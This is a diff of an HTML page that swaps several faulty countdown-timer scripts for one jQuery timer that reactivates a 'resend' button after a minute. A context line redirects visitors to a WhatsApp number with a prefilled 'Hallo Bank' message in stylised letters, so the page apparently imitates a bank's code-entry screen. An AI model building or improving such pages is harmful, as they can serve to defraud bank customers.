@@ -489,7 +489,7 @@
     </div> 
     <div class="row" style="margin-top: 120px"> 
     
-     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 15px auto;" id="waktu">1 : 00</p> 
+     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 15px auto;" id="countdown">01 : 00</p> 
     </div> 
     <div class="row"> 
      <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
@@ -664,90 +664,34 @@ location.href='https://wa.me/6285133339384?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕�
     
 }     
  </script>
+ 
 <script>
-    window.onload = function() {
-  var minute = 00;
-  var sec = 59;
-  setInterval(function() {
-    document.getElementById("waktu").innerHTML =   minute + " : " + sec  ;
-    sec--;
-
-    if (sec == 0) {
-      minute--;
-      sec = 59;
-
-      if (minute == 0) {
-        minute = 1;
-      }
-    }
-  }, 1000);
-}
-  
-  
-  
-   
-    document.getElementById('waktu1').innerHTML =
-          03 + ":" + 01;
-        startTimer();
-        
-        function startTimer() {
-          var presentTime = document.getElementById('waktu1').innerHTML;
-          var timeArray = presentTime.split(/[:]+/);
-          var m = timeArray[0];
-          var s = checkSecond((timeArray[1] - 1));
-          if(s==59){m=m-1}
-          if(m<0){
-            return
-          }
-          
-          document.getElementById('waktu1').innerHTML =
-            m + " : " + s;
-          console.log(m)
-          setTimeout(startTimer, 1000);
-          
+            function startTimer(duration) {
+            var timer = duration, minutes, seconds;
+            var display = $("#countdown");
+            var intervalId = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.text(minutes + " : " + seconds);
+                if (--timer < 0) {
+                    clearInterval(intervalId);
+                    $(".resend").css("opacity", "1");
+                    $("span.send").click(scountdown);
+                }
+            }, 1000);
         }
-        
-        function checkSecond(sec) {
-          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
-          if (sec < 0) {sec = "59"};
-          return sec;
+        function scountdown(){
+            $("span.send").off();
+            $(".resend").css("opacity", "0.5");
+            startTimer(60 * 1);
         }
-        
-        
-        
-    
+        $(document).ready(scountdown);
+
+  
     </script>  
-  <script>
-      document.getElementById('timer').innerHTML =
-          01 + ":" + 01;
-        startTimer1();
-        
-        function startTimer1() {
-          var presentTime = document.getElementById('timer').innerHTML;
-          var timeArray = presentTime.split(/[:]+/);
-          var m = timeArray[0];
-          var s = checkSecond((timeArray[1] - 1));
-          if(s==59){m=m-1}
-          if(m<0){
-            return
-          }
-          
-          document.getElementById('timer').innerHTML =
-            m + " : " + s;
-          console.log(m)
-          setTimeout(startTimer1, 1000);
-          
-        }
-        
-        function checkSecond(sec) {
-          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
-          if (sec < 0) {sec = "59"};
-          return sec;
-        }
-        
-        
-        
-  </script>
+ 
   <!-- Static App Form Collection Script -->
 <!--<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>
 
